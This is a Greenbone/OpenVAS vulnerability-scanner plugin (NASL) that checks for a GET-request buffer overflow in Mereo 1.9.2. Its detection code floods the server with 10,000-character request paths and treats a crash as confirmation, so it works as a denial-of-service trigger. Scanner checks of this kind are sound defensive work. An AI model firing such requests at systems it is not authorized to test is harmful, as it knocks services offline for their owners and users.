# SPDX-FileCopyrightText: 2010 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.100776");
  script_version("2023-07-21T05:05:22+0000");
  script_tag(name:"last_modification", value:"2023-07-21 05:05:22 +0000 (Fri, 21 Jul 2023)");
  script_tag(name:"creation_date", value:"2010-09-02 16:10:00 +0200 (Thu, 02 Sep 2010)");
  script_tag(name:"cvss_base", value:"5.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:N/I:N/A:P");

  script_name("Mereo 'GET' Request Remote Buffer Overflow Vulnerability");

  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/42839");
  script_xref(name:"URL", value:"http://www.assembla.com/spaces/mereo/wiki?id=bMd54a1Xer3OfueJe5aVNr");

  script_tag(name:"qod_type", value:"remote_analysis");
  script_category(ACT_DENIAL);
  script_family("Buffer overflow");
  script_copyright("Copyright (C) 2010 Greenbone AG");
  script_dependencies("find_service.nasl", "httpver.nasl", "os_detection.nasl", "global_settings.nasl");
  script_require_ports("Services/www", 80);
  script_mandatory_keys("Host/runs_windows");
  script_exclude_keys("Settings/disable_cgi_scanning");

  script_tag(name:"summary", value:"Mereo is prone to a remote buffer-overflow vulnerability because it
  fails to perform adequate boundary checks on user-supplied input before copying it to an insufficiently sized memory buffer.");

  script_tag(name:"impact", value:"An attacker can exploit this issue to execute arbitrary code within
  the context of the affected application. Failed exploit attempts will result in a denial-of-service condition.");

  script_tag(name:"affected", value:"Mereo 1.9.2 is vulnerable. Other versions may also be affected.");

  script_tag(name:"solution_type", value:"WillNotFix");
  script_tag(name:"solution", value:"No known solution was made available for at least one year since the disclosure
  of this vulnerability. Likely none will be provided anymore. General solution options are to upgrade to a newer
  release, disable respective features, remove the product or replace the product by another one.");

  exit(0);
}

include("http_func.inc");
include("port_service_func.inc");

port = http_get_port(default:8080);
banner = http_get_remote_headers(port:port);
if("Server:" >< banner)
  exit(0);

if(http_is_dead(port:port))
  exit(0);

url = string("/",crap(data:"X",length:10000));

for(i=0;i<25;i++) {

  req = http_get(item:url, port:port);
  res = http_send_recv(port:port, data:req);
  if(http_is_dead(port:port)) {
    security_message(port:port);
    exit(0);
  }
}

exit(99);
